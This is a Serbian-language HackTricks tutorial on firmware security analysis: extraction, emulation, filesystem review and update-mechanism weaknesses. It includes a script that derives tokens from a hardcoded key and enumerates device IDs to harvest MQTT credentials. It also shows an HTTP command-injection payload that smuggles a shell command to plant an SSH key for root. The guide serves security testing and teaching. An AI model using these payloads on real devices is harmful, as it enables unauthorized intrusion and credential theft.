# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmver je osnovni softver koji omogućava uređajima da pravilno rade tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici interaktuju. Čuva se u trajnoj memoriji, što osigurava da uređaj ima pristup ključnim instrukcijama od trenutka kada se uključi, što vodi ka pokretanju operativnog sistema. Ispitivanje i eventualno modifikovanje firmvera je ključni korak u identifikaciji bezbednosnih ranjivosti.

## **Prikupljanje informacija**

**Prikupljanje informacija** je kritičan početni korak za razumevanje sastava uređaja i tehnologija koje koristi. Ovaj proces uključuje prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- bootloader specifics
- hardverskom rasporedu i datasheets
- metrikama codebase-a i lokacijama izvornog koda
- eksternim libraries i tipovima licence
- istoriji update-a i regulatornim sertifikatima
- arhitektonskim i dijagramima toka
- bezbednosnim procenama i identifikovanim ranjivostima

Za ovu svrhu, **open-source intelligence (OSINT)** alati su neprocenjivi, kao i analiza bilo kojih dostupnih open-source softverskih komponenti kroz manuelne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu static analysis koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Dobavljanje firmvera**

Nabavka firmvera može se pristupiti na više načina, svaki sa različitim stepenom složenosti:

- **Direktno** od izvora (developers, manufacturers)
- **Sastavljanje** iz priloženih instrukcija
- **Preuzimanje** sa zvaničnih sajtova za podršku
- Korišćenje **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Direktan pristup **cloud storage**-u, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanje **update**-a putem man-in-the-middle tehnika
- **Extracting** iz uređaja preko konekcija kao što su **UART**, **JTAG**, ili **PICit**
- **Sniffing** za zahteve za update unutar komunikacije uređaja
- Identifikovanje i korišćenje **hardcoded update endpoints**
- **Dumping** iz bootloader-a ili mreže
- Uklanjanje i čitanje memorijskog čipa, kada sve drugo zakaže, koristeći odgovarajuće hardverske alate

## Analiza firmvera

Sada kada **imate firmver**, potrebno je izdvojiti informacije o njemu kako biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako ne nađete mnogo pomoću tih alata, proverite **entropiju** image-a sa `binwalk -E <bin>`, ako je entropija niska, verovatno nije enkriptovano. Ako je visoka, verovatno je enkriptovano (ili na neki način kompresovano).

Takođe, možete koristiti ove alate da ekstrahujete **fajlove ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za inspekciju fajla.

### Dobijanje filesystema

Sa prethodno pomenutim alatima kao što je `binwalk -ev <bin>` trebalo bi da ste uspeli da **ekstrahujete filesystem**.\
Binwalk obično ekstrahuje filesystem u **direktorijum nazvan prema tipu filesystema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno ekstrahovanje filesystema

Ponekad binwalk **neće imati magic byte filesystema u svojim potpisima**. U tim slučajevima, koristite binwalk da **pronađete offset filesystema i izrežete (carve) kompresovani filesystem** iz binarnog fajla i **ručno ekstrahujete** filesystem prema njegovom tipu koristeći korake ispod.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Fajlovi će se nalaziti u "`squashfs-root`" direktorijumu nakon toga.

- CPIO arhive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 datotečne sisteme

`$ jefferson rootfsfile.jffs2`

- Za ubifs datotečne sisteme sa NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Kada se firmware dobije, važno ga je rastaviti kako bi se razumeli njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.

### Initial Analysis Tools

Dat je skup komandi za početni pregled binarnog fajla (označenog kao `<bin>`). Ove komande pomažu pri identifikaciji tipova fajlova, izvlačenju stringova, analizi binarnih podataka i razumevanju detalja particija i datotečnih sistema:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da biste procenili da li je image enkriptovan, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za ekstrakciju **ugrađenih fajlova**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju fajlova.

### Ekstrakcija datotečnog sistema

Koristeći `binwalk -ev <bin>`, obično je moguće izdvojiti datotečni sistem, često u direktorijum nazvan prema tipu datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne prepozna tip datotečnog sistema zbog nedostajućih magic bajtova, neophodna je ručna ekstrakcija. To podrazumeva korišćenje `binwalk` za lociranje offseta datotečnog sistema, nakon čega sledi `dd` komanda za izrezivanje datotečnog sistema:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa fajl-sistema (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza fajl sistema

Sa izvađenim fajl-sistemom, započinje potraga za bezbednosnim propustima. Pažnja se posvećuje insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts i compiled binaries za offline analizu.

**Ključne lokacije** i **stavke** za pregled uključuju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikati i ključevi u **etc/ssl**
- Konfiguracioni i skript fajlovi koji mogu sadržati ranjivosti
- Ugrađeni binarni fajlovi za dalju analizu
- Uobičajeni web serveri i binarni fajlovi IoT uređaja

Više alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl-sistema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Provere bezbednosti kompajliranih binarnih fajlova

I izvorni kod i kompajlirani binarni fajlovi pronađeni u fajl-sistemu moraju se temeljno pregledati zbog ranjivosti. Alati poput **checksec.sh** za Unix binarne i **PESecurity** za Windows binarne pomažu u identifikaciji nezaštićenih binarnih fajlova koji se mogu iskoristiti.

## Pribavljanje cloud config i MQTT credentials putem izvedenih URL tokena

Mnogi IoT hubovi preuzimaju konfiguraciju po uređaju sa cloud endpoint-a koji izgleda ovako:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Tokom analize firmware-a možete otkriti da je <token> izveden lokalno iz deviceId koristeći hardcoded secret, na primer:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Takav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i povuče cloud config, često otkrivajući plaintext MQTT credentials i prefikse topic-a.

Praktičan tok rada:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju cloud config URL pattern i broker address, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Oporavi STATIC_KEY i algoritam tokena iz firmware-a

- Učitaj binarije u Ghidra/radare2 i potraži putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdi algoritam (npr., MD5(deviceId||STATIC_KEY)).
- Izvedi token u Bash i pretvori digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupite cloud config i MQTT credentials

- Sastavite URL i preuzmite JSON pomoću curl; parsirajte sa jq da izdvojite secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotrebite plaintext MQTT i slabe topic ACLs (ako postoje)

- Koristite recovered credentials da se pretplatite na maintenance topics i tražite sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerišite predvidljive ID-ove uređaja (u velikoj skali, uz autorizaciju)

- Mnogi ekosistemi ugrađuju proizvođačev OUI i bajtove koji označavaju proizvod/tip, praćene sekvencijalnim sufiksom.
- Možete iterativno prolaziti kroz kandidatske ID-e, izračunavati tokene i programatski dohvatati konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek dobijte izričitu autorizaciju pre nego što pokušate mass enumeration.
- Po mogućstvu preferirajte emulation ili static analysis kako biste povratili secrets bez modifikovanja target hardware kada je to moguće.

Proces emulating firmware omogućava **dynamic analysis** bilo rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na probleme zbog hardware ili architecture zavisnosti, ali prebacivanje root filesystem-a ili specifičnih binaries na uređaj sa odgovarajućom architecture i endianness-om, kao što je Raspberry Pi, ili na pre-built virtual machine, može olakšati dalja testiranja.

### Emulating Individual Binaries

Za ispitivanje pojedinačnih programa, identifikacija programa endianness-a i CPU architecture je ključna.

#### Primer za MIPS Architecture

Da biste emulirali MIPS architecture binary, možete koristiti komandu:
```bash
file ./squashfs-root/bin/busybox
```
A da instalirate neophodne alate za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke proces je sličan, koristeći emulator `qemu-arm` za emulaciju.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi, olakšavaju potpunu emulaciju firmware-a, automatizuju proces i pomažu u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi koristi se realno ili emulirano okruženje uređaja za analizu. Neophodno je održavati shell pristup OS-u i fajl-sistemu. Emulacija možda ne reprodukuje savršeno interakcije sa hardverom, što zahteva povremene restarte emulacije. Analiza treba da ponovo pregleda fajl-sistem, iskoristi izložene web stranice i mrežne servise, i istraži ranjivosti bootloader-a. Testovi integriteta firmware-a su ključni za identifikovanje potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza uključuje interakciju sa procesom ili binarnom datotekom u njegovom operativnom okruženju, koristeći alate kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoints-a i identifikovanje ranjivosti putem fuzzing-a i drugih tehnika.

## Eksploatacija binarnih datoteka i Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje ciljne arhitekture i programiranje u niskonivou jezicima. Zaštite binarnog runtime-a u ugrađenim sistemima su retke, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).

## Pripremljeni operativni sistemi za analizu firmware-a

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prethodno konfigurisana okruženja za testiranje bezbednosti firmware-a, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da vam pomogne pri izvođenju security assessment i penetration testing of Internet of Things (IoT) devices. Uštedeće vam mnogo vremena pružajući prethodno konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje ugrađene sigurnosti zasnovan na Ubuntu 18.04, unapred opremljen alatima za testiranje sigurnosti firmware-a.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Čak i kada vendor implementira kriptografske provere potpisa za firmware slike, **zaštita od version rollback-a (downgrade) često se izostavlja**. Kada boot- ili recovery-loader samo verifikuje potpis ugrađenim javnim ključem, ali ne upoređuje *version* (ili monotoni brojač) slike koja se flash-uje, napadač može legitimno instalirati **stariju, ranjivu firmware verziju koja i dalje nosi važeći potpis** i tako ponovo uneti ranjivosti koje su bile zakrpljene.

Tipičan tok napada:

1. **Nabavite stariju potpisanu sliku**
* Preuzmite je sa javnog download portala vendora, CDN-a ili sajta za podršku.
* Ekstrahujte je iz pratećih mobilnih/desktop aplikacija (npr. unutar Android APK-a pod `assets/firmware/`).
* Dohvatite je iz repozitorijuma trećih strana kao što su VirusTotal, Internet arhive, forumi, itd.
2. **Otpremite ili poslužite sliku uređaju** preko bilo kog izloženog kanala za ažuriranje:
* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
* Mnogi potrošački IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blobove, dekodiraju ih na serverskoj strani i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command-injection koji je dodat kasnije).
4. Opcionalno, vratite najnoviju sliku ili onemogućite ažuriranja da biste izbegli detekciju nakon sticanja perzistencije.

### Primer: Command Injection nakon downgrade-a
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmware-u, parametar `md5` se konkatenira direktno u shell komandu bez sanitizacije, što omogućava injektovanje proizvoljnih komandi (u ovom slučaju – omogućavanje SSH key-based root access). Kasnije verzije firmvera su uvele osnovni filter karaktera, ali odsustvo downgrade protection čini zakrpu bez efekta.

### Ekstrakcija firmvera iz mobilnih aplikacija

Mnogi proizvođači pakuju cele slike firmvera unutar svojih pratećih mobilnih aplikacija kako bi aplikacija mogla da ažurira uređaj preko Bluetooth/Wi-Fi. Ovi paketi se obično čuvaju nešifrovani u APK/APEX pod putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra`, ili čak običan `unzip` omogućavaju vam da izvučete potpisane slike bez dodirivanja fizičkog hardvera.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolna lista za procenu logike ažuriranja

* Da li su transport/autentikacija *update endpoint*-a adekvatno zaštićeni (TLS + authentication)?
* Da li uređaj upoređuje **brojeve verzije** ili **monotoni anti-rollback brojač** pre flešovanja?
* Da li se image verifikuje unutar sigurnog boot lanca (npr. signatures proverene od strane ROM koda)?
* Da li userland kod izvodi dodatne sanity provere (npr. dozvoljena mapa particija, broj modela)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu validacionu logiku?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranljiv firmware za vežbu

Za vežbanje pronalaženja ranjivosti u firmware-u, koristite sledeće ranjive firmware projekte kao polaznu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Trening i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
